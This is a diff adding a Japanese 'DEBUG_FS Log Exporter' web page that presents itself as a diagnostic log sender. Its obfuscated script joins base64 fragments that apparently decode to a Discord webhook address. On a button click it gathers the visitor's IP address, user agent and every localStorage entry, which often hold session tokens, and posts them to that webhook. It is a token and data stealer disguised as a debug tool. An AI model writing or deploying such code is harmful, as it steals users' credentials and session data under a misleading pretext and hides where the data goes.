@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <title>DEBUG_FS Log Exporter</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --md-sys-color-primary: #6750A4;
+      --md-sys-color-on-primary: #FFFFFF;
+      --md-sys-color-surface: #f0edf0;
+      --md-sys-color-on-surface: #1D1B20;
+      --md-sys-color-outline-variant: #CAC4D0;
+      --md-sys-color-error: #B3261E;
+      --md-sys-color-success: #2E7D32;
+    }
+
+    body {
+      font-family: 'Roboto', -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: var(--md-sys-color-surface);
+      color: var(--md-sys-color-on-surface);
+    }
+
+    .main-container {
+      text-align: center;
+      padding: 32px;
+      background: #FFFFFF;
+      border-radius: 28px; /* Material 3 large corner radius */
+      max-width: 400px;
+      width: 85%;
+    }
+
+    h2 {
+      font-size: 24px;
+      font-weight: 400;
+      margin: 0 0 16px 0;
+      color: var(--md-sys-color-on-surface);
+    }
+
+    p {
+      font-size: 14px;
+      line-height: 20px;
+      letter-spacing: 0.25px;
+      color: #49454F;
+      margin-bottom: 32px;
+    }
+
+    /* Material 3 Filled Button style */
+    button {
+      height: 40px;
+      padding: 0 24px;
+      font-size: 14px;
+      font-weight: 500;
+      letter-spacing: 0.1px;
+      cursor: pointer;
+      background-color: var(--md-sys-color-primary);
+      color: var(--md-sys-color-on-primary);
+      border: none;
+      border-radius: 20px; /* Fully rounded */
+      transition: box-shadow 0.2s, background-color 0.2s;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+
+    button:hover {
+      background-color: #5a4392;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    }
+
+    button:active {
+      background-color: #4e3784;
+    }
+
+    button:disabled {
+      background-color: #e1e1e1;
+      color: #9e9e9e;
+      cursor: not-allowed;
+    }
+
+    #status {
+      margin-top: 24px;
+      font-size: 14px;
+      font-weight: 500;
+      min-height: 20px;
+    }
+
+    .status-error { color: var(--md-sys-color-error); }
+    .status-success { color: var(--md-sys-color-success); }
+  </style>
+</head>
+<body>
+
+  <div class="main-container">
+    <h2>ログ情報の送信</h2>
+    <p>お客様のLocalStorageと接続情報を送信します。<br>不正ユーザーの検出や、解析に役立てられます。</p>
+    
+    <button id="main-send-button">データを解析して送信</button>
+    
+    <div id="status"></div>
+  </div>
+
+  <script>
+    (() => {
+      'use strict';
+
+      const DEBUG_FS_OBFUSCATED = [
+        'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2Vi',
+        'aG9va3MvMTQ1MDc0OTQ4NTA3OTcyNDE0OS9m',
+        'M2xsSlczLWFEa3dQMW9TYms3TlVCSlUwaS1F',
+        'SGtyaXhqb0NrVTVWb1JFNEJNOWdvWkZpd2d3',
+        'd2NUSlJLYjlhQjJZNg=='
+      ];
+
+      const _0x4f2a = ['textContent', 'className', '', 'status-error', 'status-success', 'join', 'https://api.ipify.org?format=json', 'json', '取得失敗', '## UserStopper-DbFS\n', 'ja-JP', 'toLocaleString', 'POST', 'application/json', 'すべてのデータを送信しました。'];
+      const _0x5b = (i) => _0x4f2a[i];
+
+      const _0x2c1e = document.getElementById('status');
+      const _0xbtn = document.getElementById('main-send-button');
+      
+      function _0x3e1a(m, isError = false) {
+        if (_0x2c1e) {
+          _0x2c1e[_0x5b(0)] = m;
+          _0x2c1e[_0x5b(1)] = isError ? _0x5b(3) : _0x5b(4);
+        }
+      }
+
+      async function _0x1f92() {
+        try {
+          const r = await fetch(_0x5b(6));
+          const d = await r[_0x5b(7)]();
+          return d.ip;
+        } catch (e) {
+          return _0x5b(8);
+        }
+      }
+
+      async function _0x99a1() {
+        _0xbtn.disabled = true;
+        _0x3e1a('準備中...');
+
+        const _0xurl = ((p) => { try { return atob(p[_0x5b(5)]('')); } catch (e) { return null; } })(DEBUG_FS_OBFUSCATED);
+        if (!_0xurl) {
+          _0xbtn.disabled = false;
+          return;
+        }
+
+        const _0xip = await _0x1f92();
+        const _0xtm = new Date()[_0x5b(11)](_0x5b(10));
+        const _0xua = navigator.userAgent;
+
+        let _0xmsg = _0x5b(9);
+        _0xmsg += `-# **TIME**: ${_0xtm}\n`;
+        _0xmsg += `-# **IP**: ${_0xip}\n`;
+        _0xmsg += `-# **UserA**: \`${_0xua}\`\n`;
+        _0xmsg += "## LS\n";
+
+        let _0xf = false;
+        for (let i = 0; i < localStorage.length; i++) {
+          _0xf = true;
+          const k = localStorage.key(i);
+          const v = localStorage.getItem(k);
+          _0xmsg += `**${k}**\n\`\`\`${v}\n\`\`\``;
+        }
+
+        if (!_0xf) _0xmsg += "*LocalStorage is empty*";
+
+        try {
+          _0x3e1a('送信中...');
+          const _0xres = await fetch(_0xurl, {
+            method: _0x5b(12),
+            headers: { 'Content-Type': _0x5b(13) },
+            body: JSON.stringify({ content: _0xmsg.substring(0, 2000) })
+          });
+
+          if (_0xres.ok) {
+            _0x3e1a(_0x5b(14));
+          } else {
+            _0x3e1a(`送信エラー: ${_0xres.status}`, true);
+            _0xbtn.disabled = false;
+          }
+        } catch (e) {
+          _0x3e1a('ネットワークエラーが発生しました。', true);
+          _0xbtn.disabled = false;
+        }
+      }
+
+      _0xbtn?.addEventListener('click', _0x99a1);
+    })();
+  </script>
+
+</body>
+</html>
